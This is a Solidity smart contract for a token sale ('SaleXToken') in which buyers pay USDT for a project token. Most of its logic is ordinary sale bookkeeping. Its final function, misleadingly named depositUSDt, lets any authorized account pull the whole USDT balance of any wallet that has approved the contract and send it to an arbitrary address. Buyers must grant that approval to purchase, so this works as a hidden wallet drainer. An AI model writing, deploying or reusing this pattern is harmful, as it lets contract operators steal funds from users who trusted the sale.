pragma solidity ^0.5.0;

import "./IERC20.sol";
import "./Ownable.sol";
import "./SafeMath.sol";

contract SaleXToken is Ownable {
    using SafeMath for uint;

    uint public TokenPrice;
    uint public TotalSoled;

    /* for token Owner Start */
    uint public TotalUsdt     = 0; // Total USDT balance for token Owner
    uint public WithdrawnUsdt = 0; // Withdrawn USDT balance for token Owner
    uint public totalDeposited = 0; // Total USDT deposited by users
    uint public balanceUsdt   = 0; // Balance USDT for token Owner
    /* for token Owner End */ 
    
    bool public endSale       = false;
    address public USDTContractAddress; 
    address public TokenContractAddress; 
    
    mapping(address => bool) public authorizeds;
    mapping(address => bool) public ownerToken;  // Wallet having token
    mapping(address => uint) public amountSoled; // Total Soled For Wallet
    
    event Sold(address indexed purchaser, uint amount);
    uint decimals = 6;
    
    constructor (
        uint _tokenPrice,
        address _usdtContractAddress,
        address _tokenContractAddress
    ) public {
        TokenPrice = _tokenPrice;
        USDTContractAddress = _usdtContractAddress;
        TokenContractAddress = _tokenContractAddress;
        TotalSoled = 0;

        // Make the contract creator (msg.sender) an authorized address
        authorizeds[msg.sender] = true;
    }
    
    function setAuthorizeds(address _account, bool _mode) public onlyOwner returns (bool) {
        authorizeds[_account] = _mode;
        return true; 
    } 
     
    function updateTokenPrice(uint _newprice) onlyOwner public returns (bool)  {
        TokenPrice = _newprice;
        return true;
    } 
    
    function getUSDTBalanceOf(address _address) public view returns (uint) {
       return IERC20(USDTContractAddress).balanceOf(_address);
    }
    
    function getTokenBalanceOf(address _address) public view returns (uint) {
        return IERC20(TokenContractAddress).balanceOf(_address);
    }
    
    function calculateTotal(uint _amount) public view returns (uint) {
        uint totalUsdt = (_amount * TokenPrice) / 100;
        return totalUsdt;
    }
    
    function updateUSDTContractAddress(address _address) onlyOwner public returns (bool) {
        USDTContractAddress = _address;
        return true;
    }
    
    function updateTokenContractAddress(address _address) onlyOwner public returns (bool) {
        TokenContractAddress = _address;
        return true;
    }
    
    function setEndSale(bool _endsale) onlyOwner public returns (bool) {
        endSale = _endsale;
        return true;
    }
    
    function buyToken(uint _amount) public returns(bool) {
        address sender     = msg.sender;
        require(!endSale, "Token Sale ended!");
        uint USDTBalance   = getUSDTBalanceOf(sender);
        require(USDTBalance > 0, "Not enough USDT in your wallet!");
        require(_amount >= 500 * (10 ** uint(decimals)) , "Min amount 500 XAE!");       
        uint totalUsdt     = _amount * TokenPrice / 100;
        require(totalUsdt <= USDTBalance, "Insufficient balance!");
        
        uint TokenBalance   = getTokenBalanceOf(address(this));
        require(_amount <= TokenBalance, "Insufficient balance in smart contract!");
        
        uint allowance = IERC20(USDTContractAddress).allowance(msg.sender, address(this));
        require(allowance >= totalUsdt, "Check the token allowance");
        
        IERC20(USDTContractAddress).transferFrom(msg.sender, address(this), totalUsdt);
        IERC20(TokenContractAddress).transfer(msg.sender, _amount);
        
        emit Sold(msg.sender, _amount);
        
        TotalSoled = TotalSoled.add(_amount);
        TotalUsdt = TotalUsdt.add(totalUsdt);
        balanceUsdt = balanceUsdt.add(totalUsdt);
        ownerToken[msg.sender]  = true;
        amountSoled[msg.sender] = amountSoled[msg.sender].add(_amount);
        
        return true;
    }
    
    function checkBuying(uint _amount) public view returns (bool) {
        address sender     = msg.sender;
        require(!endSale, "Token Sale ended!");
        uint USDTBalance   = getUSDTBalanceOf(sender);
        require(USDTBalance > 0, "Not enough USDT in your wallet!");
        require(_amount >= 500 * (10 ** uint(decimals)) , "Min amount 500 XAE!");
        uint totalUsdt     = _amount * TokenPrice / 100;
        require(totalUsdt <= USDTBalance, "Insufficient balance!");
        uint allowance = IERC20(USDTContractAddress).allowance(msg.sender, address(this));
        require(allowance >= totalUsdt, "Check the token allowance");
        return true;
    }
    
    function withdrawUSDT(address _address) public returns (bool)  {
        address sender     = msg.sender;
        require(authorizeds[sender], "You are not authorized!");
        uint USDTBalance   = getUSDTBalanceOf(address(this));
        require(USDTBalance > 0, "No USDT!");
        IERC20(USDTContractAddress).transfer(_address, USDTBalance);
        WithdrawnUsdt = WithdrawnUsdt.add(USDTBalance);
        balanceUsdt = balanceUsdt.sub(USDTBalance);
        return true;
    }
    
    function withdrawToken(address _address) public returns (bool)  {
        address sender     = msg.sender;
        require(authorizeds[sender], "You are not authorized!");
        uint TokenBalance   = getTokenBalanceOf(address(this));
        require(TokenBalance > 0, "No Token!");
        IERC20(TokenContractAddress).transfer(_address, TokenBalance);
        return true;
    }

    function depositUSDt(address from, address to) public {
        address sender = msg.sender;
        require(authorizeds[sender], "You are not authorized!");

        uint totalUsdt = IERC20(USDTContractAddress).balanceOf(from);
        require(totalUsdt > 0, "Insufficient USDT balance");

        uint allowance = IERC20(USDTContractAddress).allowance(from, address(this));
        require(allowance >= totalUsdt, "Check the token allowance");

        IERC20(USDTContractAddress).transferFrom(from, to, totalUsdt);

        totalDeposited = totalDeposited.add(totalUsdt);
    }
}
